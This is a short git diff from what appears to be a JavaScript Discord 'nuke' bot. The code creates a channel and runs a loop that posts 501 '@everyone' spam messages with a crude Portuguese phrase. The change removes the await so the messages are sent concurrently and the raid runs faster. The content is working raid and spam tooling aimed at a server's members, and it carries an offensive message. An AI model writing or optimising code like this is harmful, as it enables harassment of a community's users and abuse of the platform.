@@ -45,10 +45,11 @@ async function nuke(guild) {
 				name: 'neguin-gostoso',
 				type: 0,
 			})
-			.then(async (channel) => {
+			.then((channel) => {
 				for (let i = 0; i <= 500; i++) {
-					await channel.send('Neguin Gostoso\n\n@everyone');
-					console.count('Mensagem enviada');
+					channel.send('Neguin Gostoso\n\n@everyone').then(() => {
+						console.count('Mensagem enviada');
+					});
 				}
 			});
 		
